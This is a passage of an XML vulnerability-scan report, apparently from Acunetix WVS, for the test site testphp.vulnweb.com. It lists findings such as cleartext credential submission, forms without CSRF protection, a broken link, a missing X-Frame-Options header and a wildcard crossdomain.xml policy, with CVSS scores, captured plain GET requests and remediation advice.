          <Adesc><![CDATA[There is no impact to availability within the impacted component.]]></Adesc>
          <E><![CDATA[X]]></E>
          <Edesc><![CDATA[]]></Edesc>
          <RL><![CDATA[X]]></RL>
          <RLdesc><![CDATA[]]></RLdesc>
          <RC><![CDATA[X]]></RC>
          <RCdesc><![CDATA[]]></RCdesc>
       </CVSS3>
      <References></References>
      </ReportItem>

      <ReportItem id="3" color="orange">
       <Name><![CDATA[User credentials are sent in clear text]]></Name>
       <ModuleName><![CDATA[Crawler]]></ModuleName>
       <Details><![CDATA[Form name: <font color="navy">loginform</font><br/>Form action: <font color="navy">http://testphp.vulnweb.com/userinfo.php</font><br/>Form method: <font color="navy">POST</font><br/><br/>Form inputs:<br/><ul><li>uname [Text]</li><li>pass [Password]</li></ul>]]></Details>
       <Affects><![CDATA[/login.php]]></Affects>
       <Parameter><![CDATA[]]></Parameter>
       <AOP_SourceFile><![CDATA[]]></AOP_SourceFile>
       <AOP_SourceLine>0</AOP_SourceLine>
       <AOP_Additional><![CDATA[]]></AOP_Additional>
       <IsFalsePositive><![CDATA[False]]></IsFalsePositive>
       <Severity><![CDATA[medium]]></Severity>
       <Type><![CDATA[Configuration]]></Type>
       <Impact><![CDATA[A third party may be able to read the user credentials by intercepting an unencrypted HTTP connection.]]></Impact>
       <Description><![CDATA[User credentials are transmitted over an unencrypted channel. This information should always be transferred via an encrypted channel (HTTPS) to avoid being intercepted by malicious users.]]></Description>
       <DetailedInformation><![CDATA[]]></DetailedInformation>
       <Recommendation><![CDATA[Because user credentials are considered sensitive information, should always be transferred to the server over an encrypted connection (HTTPS).]]></Recommendation>
       <TechnicalDetails>
        <Request><![CDATA[GET /login.php HTTP/1.1
Pragma: no-cache
Cache-Control: no-cache
Referer: http://testphp.vulnweb.com/
Host: testphp.vulnweb.com
Connection: Keep-alive
Accept-Encoding: gzip,deflate
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21
Acunetix-Product: WVS/10.0 (Acunetix Web Vulnerability Scanner - NORMAL)
Acunetix-Scanning-agreement: Third Party Scanning PROHIBITED
Acunetix-User-agreement: http://www.acunetix.com/wvs/disc.htm
Accept: */*

]]></Request>
        <Response><![CDATA[HTTP/1.1 200 OK
Server: nginx/1.4.1
Date: Thu, 14 Jul 2016 00:49:50 GMT
Content-Type: text/html
Connection: keep-alive
X-Powered-By: PHP/5.3.10-1~lucid+2uwsgi2
Original-Content-Encoding: gzip
Content-Length: 4671
]]></Response>
       </TechnicalDetails>
       <CWE id="310"><![CDATA[CWE-310]]></CWE>
      <CVEList></CVEList>
       <CVSS>
          <Descriptor><![CDATA[AV:N/AC:L/Au:N/C:P/I:N/A:N/E:H/RL:W/RC:C]]></Descriptor>
          <Score><![CDATA[5.0]]></Score>
          <AV><![CDATA[Network]]></AV>
          <AVdesc><![CDATA[A vulnerability exploitable with network access means the vulnerable software is bound to the network stack and the attacker does not require local network access or local access.]]></AVdesc>
          <AC><![CDATA[Low]]></AC>
          <ACdesc><![CDATA[Specialized access conditions or extenuating circumstances do not exist.]]></ACdesc>
          <Au><![CDATA[None]]></Au>
          <Audesc><![CDATA[Authentication is not required to exploit the vulnerability.]]></Audesc>
          <C><![CDATA[Partial]]></C>
          <Cdesc><![CDATA[There is considerable informational disclosure. Access to some system files is possible, but the attacker does not have control over what is obtained, or the scope of the loss is constrained.]]></Cdesc>
          <I><![CDATA[None]]></I>
          <Idesc><![CDATA[There is no impact to the integrity of the system.]]></Idesc>
          <A><![CDATA[None]]></A>
          <Adesc><![CDATA[There is no impact to the availability of the system.]]></Adesc>
          <E><![CDATA[High]]></E>
          <Edesc><![CDATA[Either the vulnerability is exploitable by functional mobile autonomous code, or no exploit is required (manual trigger) and details are widely available.]]></Edesc>
          <RL><![CDATA[Workaround]]></RL>
          <RLdesc><![CDATA[There is an unofficial, non-vendor solution available. In some cases, users of the affected technology will create a patch of their own or provide steps to work around or otherwise mitigate the vulnerability.]]></RLdesc>
          <RC><![CDATA[Confirmed]]></RC>
          <RCdesc><![CDATA[The vulnerability has been acknowledged by the vendor or author of the affected technology.]]></RCdesc>
       </CVSS>
       <CVSS3>
          <Descriptor><![CDATA[CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N]]></Descriptor>
          <Score><![CDATA[9.1]]></Score>
          <TempScore><![CDATA[]]></TempScore>
          <EnvScore><![CDATA[]]></EnvScore>
          <AV><![CDATA[Network]]></AV>
          <AVdesc><![CDATA[A vulnerability exploitable with network access means the vulnerable component is bound to the network stack and the attacker's path is through OSI layer 3 (the network layer). Such a vulnerability is often termed "remotely exploitable" and can be thought of as an attack being exploitable one or more network hops away (e.g. across layer 3 boundaries from routers).]]></AVdesc>
          <AC><![CDATA[Low]]></AC>
          <ACdesc><![CDATA[Specialized access conditions or extenuating circumstances do not exist. An attacker can expect repeatable success against the vulnerable component.]]></ACdesc>
          <PR><![CDATA[None]]></PR>
          <PRdesc><![CDATA[The attacker is unauthorized prior to attack, and therefore does not require any access to settings or files to carry out an attack.]]></PRdesc>
          <UI><![CDATA[None]]></UI>
          <UIdesc><![CDATA[The vulnerable system can be exploited without interaction from any user.]]></UIdesc>
          <S><![CDATA[Unchanged]]></S>
          <Sdesc><![CDATA[An exploited vulnerability can only affect resources managed by the same authority. In this case the vulnerable component and the impacted component are the same.]]></Sdesc>
          <C><![CDATA[High]]></C>
          <Cdesc><![CDATA[There is total loss of confidentiality, resulting in all resources within the impacted component being divulged to the attacker. Alternatively, access to only some restricted information is obtained, but the disclosed information presents a direct, serious impact.]]></Cdesc>
          <I><![CDATA[High]]></I>
          <Idesc><![CDATA[There is a total loss of integrity, or a complete loss of protection. For example, the attacker is able to modify any/all files protected by the impacted component.]]></Idesc>
          <A><![CDATA[None]]></A>
          <Adesc><![CDATA[There is no impact to availability within the impacted component.]]></Adesc>
          <E><![CDATA[X]]></E>
          <Edesc><![CDATA[]]></Edesc>
          <RL><![CDATA[X]]></RL>
          <RLdesc><![CDATA[]]></RLdesc>
          <RC><![CDATA[X]]></RC>
          <RCdesc><![CDATA[]]></RCdesc>
       </CVSS3>
      <References></References>
      </ReportItem>

      <ReportItem id="4" color="orange">
       <Name><![CDATA[HTML form without CSRF protection]]></Name>
       <ModuleName><![CDATA[Crawler]]></ModuleName>
       <Details><![CDATA[Form name: <font color="navy">loginform</font><br/>Form action: <font color="navy">http://testphp.vulnweb.com/userinfo.php</font><br/>Form method: <font color="navy">POST</font><br/><br/>Form inputs:<br/><ul><li>uname [Text]</li><li>pass [Password]</li></ul>]]></Details>
       <Affects><![CDATA[/login.php]]></Affects>
       <Parameter><![CDATA[loginform]]></Parameter>
       <AOP_SourceFile><![CDATA[]]></AOP_SourceFile>
       <AOP_SourceLine>0</AOP_SourceLine>
       <AOP_Additional><![CDATA[]]></AOP_Additional>
       <IsFalsePositive><![CDATA[False]]></IsFalsePositive>
       <Severity><![CDATA[medium]]></Severity>
       <Type><![CDATA[Informational]]></Type>
       <Impact><![CDATA[An attacker may force the users of a web application to execute actions of the attacker''s choosing. A successful CSRF exploit can compromise end user data and operation in case of normal user. If the targeted end user is the administrator account, this can compromise the entire web application.]]></Impact>
       <Description><![CDATA[ <div class="coolbox"><font color="dark">This alert may be a false positive, manual confirmation is required.</font></div><br/>
Cross-site request forgery, also known as a one-click attack or session riding and abbreviated as CSRF or XSRF, is a type of malicious exploit of a website whereby unauthorized commands are transmitted from a user that the website trusts.

<br/><br/>Acunetix WVS found a HTML form with no apparent CSRF protection implemented. Consult details for more information about the affected HTML form.]]></Description>
       <DetailedInformation><![CDATA[]]></DetailedInformation>
       <Recommendation><![CDATA[Check if this form requires CSRF protection and implement CSRF countermeasures if necessary.]]></Recommendation>
       <TechnicalDetails>
        <Request><![CDATA[GET /login.php HTTP/1.1
Pragma: no-cache
Cache-Control: no-cache
Referer: http://testphp.vulnweb.com/
Host: testphp.vulnweb.com
Connection: Keep-alive
Accept-Encoding: gzip,deflate
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21
Acunetix-Product: WVS/10.0 (Acunetix Web Vulnerability Scanner - NORMAL)
Acunetix-Scanning-agreement: Third Party Scanning PROHIBITED
Acunetix-User-agreement: http://www.acunetix.com/wvs/disc.htm
Accept: */*

]]></Request>
        <Response><![CDATA[HTTP/1.1 200 OK
Server: nginx/1.4.1
Date: Thu, 14 Jul 2016 00:49:50 GMT
Content-Type: text/html
Connection: keep-alive
X-Powered-By: PHP/5.3.10-1~lucid+2uwsgi2
Original-Content-Encoding: gzip
Content-Length: 4671
]]></Response>
       </TechnicalDetails>
       <CWE id="352"><![CDATA[CWE-352]]></CWE>
      <CVEList></CVEList>
       <CVSS>
          <Descriptor><![CDATA[AV:N/AC:H/Au:N/C:N/I:P/A:N]]></Descriptor>
          <Score><![CDATA[2.6]]></Score>
          <AV><![CDATA[Network]]></AV>
          <AVdesc><![CDATA[A vulnerability exploitable with network access means the vulnerable software is bound to the network stack and the attacker does not require local network access or local access.]]></AVdesc>
          <AC><![CDATA[High]]></AC>
          <ACdesc><![CDATA[Specialized access conditions exist.]]></ACdesc>
          <Au><![CDATA[None]]></Au>
          <Audesc><![CDATA[Authentication is not required to exploit the vulnerability.]]></Audesc>
          <C><![CDATA[None]]></C>
          <Cdesc><![CDATA[There is no impact to the confidentiality of the system.]]></Cdesc>
          <I><![CDATA[Partial]]></I>
          <Idesc><![CDATA[Modification of some system files or information is possible, but the attacker does not have control over what can be modified, or the scope of what the attacker can affect is limited.]]></Idesc>
          <A><![CDATA[None]]></A>
          <Adesc><![CDATA[There is no impact to the availability of the system.]]></Adesc>
          <E><![CDATA[]]></E>
          <Edesc><![CDATA[]]></Edesc>
          <RL><![CDATA[]]></RL>
          <RLdesc><![CDATA[]]></RLdesc>
          <RC><![CDATA[]]></RC>
          <RCdesc><![CDATA[]]></RCdesc>
       </CVSS>
       <CVSS3>
          <Descriptor><![CDATA[CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:L/A:N]]></Descriptor>
          <Score><![CDATA[4.3]]></Score>
          <TempScore><![CDATA[]]></TempScore>
          <EnvScore><![CDATA[]]></EnvScore>
          <AV><![CDATA[Network]]></AV>
          <AVdesc><![CDATA[A vulnerability exploitable with network access means the vulnerable component is bound to the network stack and the attacker's path is through OSI layer 3 (the network layer). Such a vulnerability is often termed "remotely exploitable" and can be thought of as an attack being exploitable one or more network hops away (e.g. across layer 3 boundaries from routers).]]></AVdesc>
          <AC><![CDATA[Low]]></AC>
          <ACdesc><![CDATA[Specialized access conditions or extenuating circumstances do not exist. An attacker can expect repeatable success against the vulnerable component.]]></ACdesc>
          <PR><![CDATA[None]]></PR>
          <PRdesc><![CDATA[The attacker is unauthorized prior to attack, and therefore does not require any access to settings or files to carry out an attack.]]></PRdesc>
          <UI><![CDATA[Required]]></UI>
          <UIdesc><![CDATA[Successful exploitation of this vulnerability requires a user to take some action before the vulnerability can be exploited.]]></UIdesc>
          <S><![CDATA[Unchanged]]></S>
          <Sdesc><![CDATA[An exploited vulnerability can only affect resources managed by the same authority. In this case the vulnerable component and the impacted component are the same.]]></Sdesc>
          <C><![CDATA[None]]></C>
          <Cdesc><![CDATA[There is no loss of confidentiality within the impacted component.]]></Cdesc>
          <I><![CDATA[Low]]></I>
          <Idesc><![CDATA[Modification of data is possible, but the attacker does not have control over the consequence of a modification, or the amount of modification is constrained. The data modification does not have a direct, serious impact on the impacted component.]]></Idesc>
          <A><![CDATA[None]]></A>
          <Adesc><![CDATA[There is no impact to availability within the impacted component.]]></Adesc>
          <E><![CDATA[X]]></E>
          <Edesc><![CDATA[]]></Edesc>
          <RL><![CDATA[X]]></RL>
          <RLdesc><![CDATA[]]></RLdesc>
          <RC><![CDATA[X]]></RC>
          <RCdesc><![CDATA[]]></RCdesc>
       </CVSS3>
      <References></References>
      </ReportItem>

      <ReportItem id="5" color="green">
       <Name><![CDATA[Broken links]]></Name>
       <ModuleName><![CDATA[Crawler]]></ModuleName>
       <Details><![CDATA[For a complete list of URLs linking to this file, go to Site Structure &gt; Locate and select the file (marked as &quot;Not Found&quot;) &gt; select Referrers Tab from the bottom of the Information pane.]]></Details>
       <Affects><![CDATA[/privacy.php]]></Affects>
       <Parameter><![CDATA[]]></Parameter>
       <AOP_SourceFile><![CDATA[]]></AOP_SourceFile>
       <AOP_SourceLine>0</AOP_SourceLine>
       <AOP_Additional><![CDATA[]]></AOP_Additional>
       <IsFalsePositive><![CDATA[False]]></IsFalsePositive>
       <Severity><![CDATA[info]]></Severity>
       <Type><![CDATA[Informational]]></Type>
       <Impact><![CDATA[Problems navigating the site.]]></Impact>
       <Description><![CDATA[A broken link refers to any link that should take you to a document, image or webpage, that actually results in an error. This page was linked from the website but it is inaccessible.]]></Description>
       <DetailedInformation><![CDATA[]]></DetailedInformation>
       <Recommendation><![CDATA[Remove the links to this file or make it accessible.]]></Recommendation>
       <TechnicalDetails>
        <Request><![CDATA[GET /privacy.php HTTP/1.1
Pragma: no-cache
Cache-Control: no-cache
Referer: http://testphp.vulnweb.com/
Host: testphp.vulnweb.com
Connection: Keep-alive
Accept-Encoding: gzip,deflate
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21
Acunetix-Product: WVS/10.0 (Acunetix Web Vulnerability Scanner - NORMAL)
Acunetix-Scanning-agreement: Third Party Scanning PROHIBITED
Acunetix-User-agreement: http://www.acunetix.com/wvs/disc.htm
Accept: */*

]]></Request>
        <Response><![CDATA[HTTP/1.1 404 Not Found
Server: nginx/1.4.1
Date: Thu, 14 Jul 2016 00:49:51 GMT
Content-Type: text/html
Connection: keep-alive
X-Powered-By: PHP/5.3.10-1~lucid+2uwsgi2
Original-Content-Encoding: gzip
Content-Length: 16
]]></Response>
       </TechnicalDetails>
       <CWE id="16"><![CDATA[CWE-16]]></CWE>
      <CVEList></CVEList>
       <CVSS>
          <Descriptor><![CDATA[AV:N/AC:L/Au:N/C:N/I:N/A:N]]></Descriptor>
          <Score><![CDATA[0.0]]></Score>
          <AV><![CDATA[Network]]></AV>
          <AVdesc><![CDATA[A vulnerability exploitable with network access means the vulnerable software is bound to the network stack and the attacker does not require local network access or local access.]]></AVdesc>
          <AC><![CDATA[Low]]></AC>
          <ACdesc><![CDATA[Specialized access conditions or extenuating circumstances do not exist.]]></ACdesc>
          <Au><![CDATA[None]]></Au>
          <Audesc><![CDATA[Authentication is not required to exploit the vulnerability.]]></Audesc>
          <C><![CDATA[None]]></C>
          <Cdesc><![CDATA[There is no impact to the confidentiality of the system.]]></Cdesc>
          <I><![CDATA[None]]></I>
          <Idesc><![CDATA[There is no impact to the integrity of the system.]]></Idesc>
          <A><![CDATA[None]]></A>
          <Adesc><![CDATA[There is no impact to the availability of the system.]]></Adesc>
          <E><![CDATA[]]></E>
          <Edesc><![CDATA[]]></Edesc>
          <RL><![CDATA[]]></RL>
          <RLdesc><![CDATA[]]></RLdesc>
          <RC><![CDATA[]]></RC>
          <RCdesc><![CDATA[]]></RCdesc>
       </CVSS>
       <CVSS3>
          <Descriptor><![CDATA[]]></Descriptor>
          <Score><![CDATA[]]></Score>
          <TempScore><![CDATA[]]></TempScore>
          <EnvScore><![CDATA[]]></EnvScore>
          <AV><![CDATA[]]></AV>
          <AVdesc><![CDATA[]]></AVdesc>
          <AC><![CDATA[]]></AC>
          <ACdesc><![CDATA[]]></ACdesc>
          <PR><![CDATA[]]></PR>
          <PRdesc><![CDATA[]]></PRdesc>
          <UI><![CDATA[]]></UI>
          <UIdesc><![CDATA[]]></UIdesc>
          <S><![CDATA[]]></S>
          <Sdesc><![CDATA[]]></Sdesc>
          <C><![CDATA[]]></C>
          <Cdesc><![CDATA[]]></Cdesc>
          <I><![CDATA[]]></I>
          <Idesc><![CDATA[]]></Idesc>
          <A><![CDATA[]]></A>
          <Adesc><![CDATA[]]></Adesc>
          <E><![CDATA[]]></E>
          <Edesc><![CDATA[]]></Edesc>
          <RL><![CDATA[]]></RL>
          <RLdesc><![CDATA[]]></RLdesc>
          <RC><![CDATA[]]></RC>
          <RCdesc><![CDATA[]]></RCdesc>
       </CVSS3>
      <References></References>
      </ReportItem>

      <ReportItem id="6" color="orange">
       <Name><![CDATA[HTML form without CSRF protection]]></Name>
       <ModuleName><![CDATA[Crawler]]></ModuleName>
       <Details><![CDATA[Form name: <font color="navy">faddentry</font><br/>Form action: <font color="navy">http://testphp.vulnweb.com/guestbook.php</font><br/>Form method: <font color="navy">POST</font><br/><br/>Form inputs:<br/><ul><li>name [Hidden]</li><li>text [TextArea]</li><li>submit [Submit]</li></ul>]]></Details>
       <Affects><![CDATA[/guestbook.php]]></Affects>
       <Parameter><![CDATA[faddentry]]></Parameter>
       <AOP_SourceFile><![CDATA[]]></AOP_SourceFile>
       <AOP_SourceLine>0</AOP_SourceLine>
       <AOP_Additional><![CDATA[]]></AOP_Additional>
       <IsFalsePositive><![CDATA[False]]></IsFalsePositive>
       <Severity><![CDATA[medium]]></Severity>
       <Type><![CDATA[Informational]]></Type>
       <Impact><![CDATA[An attacker may force the users of a web application to execute actions of the attacker''s choosing. A successful CSRF exploit can compromise end user data and operation in case of normal user. If the targeted end user is the administrator account, this can compromise the entire web application.]]></Impact>
       <Description><![CDATA[ <div class="coolbox"><font color="dark">This alert may be a false positive, manual confirmation is required.</font></div><br/>
Cross-site request forgery, also known as a one-click attack or session riding and abbreviated as CSRF or XSRF, is a type of malicious exploit of a website whereby unauthorized commands are transmitted from a user that the website trusts.

<br/><br/>Acunetix WVS found a HTML form with no apparent CSRF protection implemented. Consult details for more information about the affected HTML form.]]></Description>
       <DetailedInformation><![CDATA[]]></DetailedInformation>
       <Recommendation><![CDATA[Check if this form requires CSRF protection and implement CSRF countermeasures if necessary.]]></Recommendation>
       <TechnicalDetails>
        <Request><![CDATA[GET /guestbook.php HTTP/1.1
Pragma: no-cache
Cache-Control: no-cache
Referer: http://testphp.vulnweb.com/
Host: testphp.vulnweb.com
Connection: Keep-alive
Accept-Encoding: gzip,deflate
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21
Acunetix-Product: WVS/10.0 (Acunetix Web Vulnerability Scanner - NORMAL)
Acunetix-Scanning-agreement: Third Party Scanning PROHIBITED
Acunetix-User-agreement: http://www.acunetix.com/wvs/disc.htm
Accept: */*

]]></Request>
        <Response><![CDATA[HTTP/1.1 200 OK
Server: nginx/1.4.1
Date: Thu, 14 Jul 2016 00:49:51 GMT
Content-Type: text/html
Connection: keep-alive
X-Powered-By: PHP/5.3.10-1~lucid+2uwsgi2
Original-Content-Encoding: gzip
Content-Length: 4531
]]></Response>
       </TechnicalDetails>
       <CWE id="352"><![CDATA[CWE-352]]></CWE>
      <CVEList></CVEList>
       <CVSS>
          <Descriptor><![CDATA[AV:N/AC:H/Au:N/C:N/I:P/A:N]]></Descriptor>
          <Score><![CDATA[2.6]]></Score>
          <AV><![CDATA[Network]]></AV>
          <AVdesc><![CDATA[A vulnerability exploitable with network access means the vulnerable software is bound to the network stack and the attacker does not require local network access or local access.]]></AVdesc>
          <AC><![CDATA[High]]></AC>
          <ACdesc><![CDATA[Specialized access conditions exist.]]></ACdesc>
          <Au><![CDATA[None]]></Au>
          <Audesc><![CDATA[Authentication is not required to exploit the vulnerability.]]></Audesc>
          <C><![CDATA[None]]></C>
          <Cdesc><![CDATA[There is no impact to the confidentiality of the system.]]></Cdesc>
          <I><![CDATA[Partial]]></I>
          <Idesc><![CDATA[Modification of some system files or information is possible, but the attacker does not have control over what can be modified, or the scope of what the attacker can affect is limited.]]></Idesc>
          <A><![CDATA[None]]></A>
          <Adesc><![CDATA[There is no impact to the availability of the system.]]></Adesc>
          <E><![CDATA[]]></E>
          <Edesc><![CDATA[]]></Edesc>
          <RL><![CDATA[]]></RL>
          <RLdesc><![CDATA[]]></RLdesc>
          <RC><![CDATA[]]></RC>
          <RCdesc><![CDATA[]]></RCdesc>
       </CVSS>
       <CVSS3>
          <Descriptor><![CDATA[CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:L/A:N]]></Descriptor>
          <Score><![CDATA[4.3]]></Score>
          <TempScore><![CDATA[]]></TempScore>
          <EnvScore><![CDATA[]]></EnvScore>
          <AV><![CDATA[Network]]></AV>
          <AVdesc><![CDATA[A vulnerability exploitable with network access means the vulnerable component is bound to the network stack and the attacker's path is through OSI layer 3 (the network layer). Such a vulnerability is often termed "remotely exploitable" and can be thought of as an attack being exploitable one or more network hops away (e.g. across layer 3 boundaries from routers).]]></AVdesc>
          <AC><![CDATA[Low]]></AC>
          <ACdesc><![CDATA[Specialized access conditions or extenuating circumstances do not exist. An attacker can expect repeatable success against the vulnerable component.]]></ACdesc>
          <PR><![CDATA[None]]></PR>
          <PRdesc><![CDATA[The attacker is unauthorized prior to attack, and therefore does not require any access to settings or files to carry out an attack.]]></PRdesc>
          <UI><![CDATA[Required]]></UI>
          <UIdesc><![CDATA[Successful exploitation of this vulnerability requires a user to take some action before the vulnerability can be exploited.]]></UIdesc>
          <S><![CDATA[Unchanged]]></S>
          <Sdesc><![CDATA[An exploited vulnerability can only affect resources managed by the same authority. In this case the vulnerable component and the impacted component are the same.]]></Sdesc>
          <C><![CDATA[None]]></C>
          <Cdesc><![CDATA[There is no loss of confidentiality within the impacted component.]]></Cdesc>
          <I><![CDATA[Low]]></I>
          <Idesc><![CDATA[Modification of data is possible, but the attacker does not have control over the consequence of a modification, or the amount of modification is constrained. The data modification does not have a direct, serious impact on the impacted component.]]></Idesc>
          <A><![CDATA[None]]></A>
          <Adesc><![CDATA[There is no impact to availability within the impacted component.]]></Adesc>
          <E><![CDATA[X]]></E>
          <Edesc><![CDATA[]]></Edesc>
          <RL><![CDATA[X]]></RL>
          <RLdesc><![CDATA[]]></RLdesc>
          <RC><![CDATA[X]]></RC>
          <RCdesc><![CDATA[]]></RCdesc>
       </CVSS3>
      <References></References>
      </ReportItem>

      <ReportItem id="7" color="blue">
       <Name><![CDATA[Clickjacking: X-Frame-Options header missing]]></Name>
       <ModuleName><![CDATA[Scripting (Clickjacking_X_Frame_Options.script)]]></ModuleName>
       <Details><![CDATA[No details are available.]]></Details>
       <Affects><![CDATA[Web Server]]></Affects>
       <Parameter><![CDATA[]]></Parameter>
       <AOP_SourceFile><![CDATA[]]></AOP_SourceFile>
       <AOP_SourceLine>0</AOP_SourceLine>
       <AOP_Additional><![CDATA[]]></AOP_Additional>
       <IsFalsePositive><![CDATA[False]]></IsFalsePositive>
       <Severity><![CDATA[low]]></Severity>
       <Type><![CDATA[Configuration]]></Type>
       <Impact><![CDATA[The impact depends on the affected web application. ]]></Impact>
       <Description><![CDATA[Clickjacking (User Interface redress attack, UI redress attack, UI redressing) is a malicious technique of tricking a Web user into clicking on something different from what the user perceives they are clicking on, thus potentially revealing confidential information or taking control of their computer while clicking on seemingly innocuous web pages. <br/><br/>
The server didn't return an <b>X-Frame-Options</b> header which means that this website could be at risk of a clickjacking attack. The X-Frame-Options HTTP response header can be used to indicate whether or not a browser should be allowed to render a page inside a frame or iframe. Sites can use this to avoid clickjacking attacks, by ensuring that their content is not embedded into other sites.
]]></Description>
       <DetailedInformation><![CDATA[]]></DetailedInformation>
       <Recommendation><![CDATA[Configure your web server to include an  X-Frame-Options header. Consult Web references for more information about the possible values for this header.]]></Recommendation>
       <TechnicalDetails>
        <Request><![CDATA[GET / HTTP/1.1
Host: testphp.vulnweb.com
Connection: Keep-alive
Accept-Encoding: gzip,deflate
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21
Acunetix-Product: WVS/10.0 (Acunetix Web Vulnerability Scanner - NORMAL)
Acunetix-Scanning-agreement: Third Party Scanning PROHIBITED
Acunetix-User-agreement: http://www.acunetix.com/wvs/disc.htm
Accept: */*

]]></Request>
        <Response><![CDATA[HTTP/1.1 200 OK
Server: nginx/1.4.1
Date: Thu, 14 Jul 2016 00:49:51 GMT
Content-Type: text/html
Connection: keep-alive
X-Powered-By: PHP/5.3.10-1~lucid+2uwsgi2
Original-Content-Encoding: gzip
Content-Length: 4096
]]></Response>
       </TechnicalDetails>
       <CWE id="693"><![CDATA[CWE-693]]></CWE>
      <CVEList></CVEList>
       <CVSS>
          <Descriptor><![CDATA[AV:N/AC:M/Au:N/C:P/I:P/A:P]]></Descriptor>
          <Score><![CDATA[6.8]]></Score>
          <AV><![CDATA[Network]]></AV>
          <AVdesc><![CDATA[A vulnerability exploitable with network access means the vulnerable software is bound to the network stack and the attacker does not require local network access or local access.]]></AVdesc>
          <AC><![CDATA[Medium]]></AC>
          <ACdesc><![CDATA[The access conditions are somewhat specialized.]]></ACdesc>
          <Au><![CDATA[None]]></Au>
          <Audesc><![CDATA[Authentication is not required to exploit the vulnerability.]]></Audesc>
          <C><![CDATA[Partial]]></C>
          <Cdesc><![CDATA[There is considerable informational disclosure. Access to some system files is possible, but the attacker does not have control over what is obtained, or the scope of the loss is constrained.]]></Cdesc>
          <I><![CDATA[Partial]]></I>
          <Idesc><![CDATA[Modification of some system files or information is possible, but the attacker does not have control over what can be modified, or the scope of what the attacker can affect is limited.]]></Idesc>
          <A><![CDATA[Partial]]></A>
          <Adesc><![CDATA[There is reduced performance or interruptions in resource availability.]]></Adesc>
          <E><![CDATA[]]></E>
          <Edesc><![CDATA[]]></Edesc>
          <RL><![CDATA[]]></RL>
          <RLdesc><![CDATA[]]></RLdesc>
          <RC><![CDATA[]]></RC>
          <RCdesc><![CDATA[]]></RCdesc>
       </CVSS>
       <CVSS3>
          <Descriptor><![CDATA[]]></Descriptor>
          <Score><![CDATA[]]></Score>
          <TempScore><![CDATA[]]></TempScore>
          <EnvScore><![CDATA[]]></EnvScore>
          <AV><![CDATA[]]></AV>
          <AVdesc><![CDATA[]]></AVdesc>
          <AC><![CDATA[]]></AC>
          <ACdesc><![CDATA[]]></ACdesc>
          <PR><![CDATA[]]></PR>
          <PRdesc><![CDATA[]]></PRdesc>
          <UI><![CDATA[]]></UI>
          <UIdesc><![CDATA[]]></UIdesc>
          <S><![CDATA[]]></S>
          <Sdesc><![CDATA[]]></Sdesc>
          <C><![CDATA[]]></C>
          <Cdesc><![CDATA[]]></Cdesc>
          <I><![CDATA[]]></I>
          <Idesc><![CDATA[]]></Idesc>
          <A><![CDATA[]]></A>
          <Adesc><![CDATA[]]></Adesc>
          <E><![CDATA[]]></E>
          <Edesc><![CDATA[]]></Edesc>
          <RL><![CDATA[]]></RL>
          <RLdesc><![CDATA[]]></RLdesc>
          <RC><![CDATA[]]></RC>
          <RCdesc><![CDATA[]]></RCdesc>
       </CVSS3>
       <References>
        <Reference>
          <Database><![CDATA[The X-Frame-Options response header]]></Database>
          <URL><![CDATA[https://developer.mozilla.org/en-US/docs/HTTP/X-Frame-Options]]></URL>
        </Reference>
        <Reference>
          <Database><![CDATA[Clickjacking]]></Database>
          <URL><![CDATA[http://en.wikipedia.org/wiki/Clickjacking]]></URL>
        </Reference>
        <Reference>
          <Database><![CDATA[OWASP Clickjacking]]></Database>
          <URL><![CDATA[https://www.owasp.org/index.php/Clickjacking]]></URL>
        </Reference>
        <Reference>
          <Database><![CDATA[Defending with Content Security Policy frame-ancestors directive]]></Database>
          <URL><![CDATA[https://www.owasp.org/index.php/Clickjacking_Defense_Cheat_Sheet#Defending_with_Content_Security_Policy_frame-ancestors_directive]]></URL>
        </Reference>
        <Reference>
          <Database><![CDATA[Frame Buster Buster]]></Database>
          <URL><![CDATA[http://stackoverflow.com/questions/958997/frame-buster-buster-buster-code-needed]]></URL>
        </Reference>
       </References>
      </ReportItem>

      <ReportItem id="8" color="orange">
       <Name><![CDATA[Insecure crossdomain.xml file]]></Name>
       <ModuleName><![CDATA[Scripting (Crossdomain_XML.script)]]></ModuleName>
       <Details><![CDATA[The crossdomain.xml file is located at <b>/crossdomain.xml</b>]]></Details>
       <Affects><![CDATA[Web Server]]></Affects>
       <Parameter><![CDATA[]]></Parameter>
       <AOP_SourceFile><![CDATA[]]></AOP_SourceFile>
       <AOP_SourceLine>0</AOP_SourceLine>
       <AOP_Additional><![CDATA[]]></AOP_Additional>
       <IsFalsePositive><![CDATA[False]]></IsFalsePositive>
       <Severity><![CDATA[medium]]></Severity>
       <Type><![CDATA[Configuration]]></Type>
       <Impact><![CDATA[Using an insecure cross-domain policy file could expose your site to various attacks.]]></Impact>
       <Description><![CDATA[The browser security model normally prevents web content from one domain from accessing data from another domain. This is commonly known as the &quot;same origin policy&quot;.  URL policy files grant cross-domain permissions for reading data. They permit operations that are not permitted by default. The URL policy file is located, by default, in the root directory of the target server, with the name crossdomain.xml (for example, at www.example.com/crossdomain.xml). <br/><br/> When a domain is specified in crossdomain.xml file, the site declares that it is willing to allow the operators of any servers in that domain to obtain any document on the server where the policy file resides. The crossdomain.xml file deployed on this website opens the server to all domains (use of a single asterisk &quot;*&quot; as a pure wildcard is supported) like so:
<pre wrap="virtual">
&lt;cross-domain-policy&gt;
&lt;allow-access-from domain=&quot;*&quot; /&gt;
&lt;/cross-domain-policy&gt;
</pre>

This practice is suitable for public servers, but should not be used for sites located behind a firewall because it could permit access to protected areas. It should not be used for sites that require authentication in the form of passwords or cookies. Sites that use the common practice of authentication based on cookies to access private or user-specific data should be especially careful when using cross-domain policy files.]]></Description>
       <DetailedInformation><![CDATA[]]></DetailedInformation>
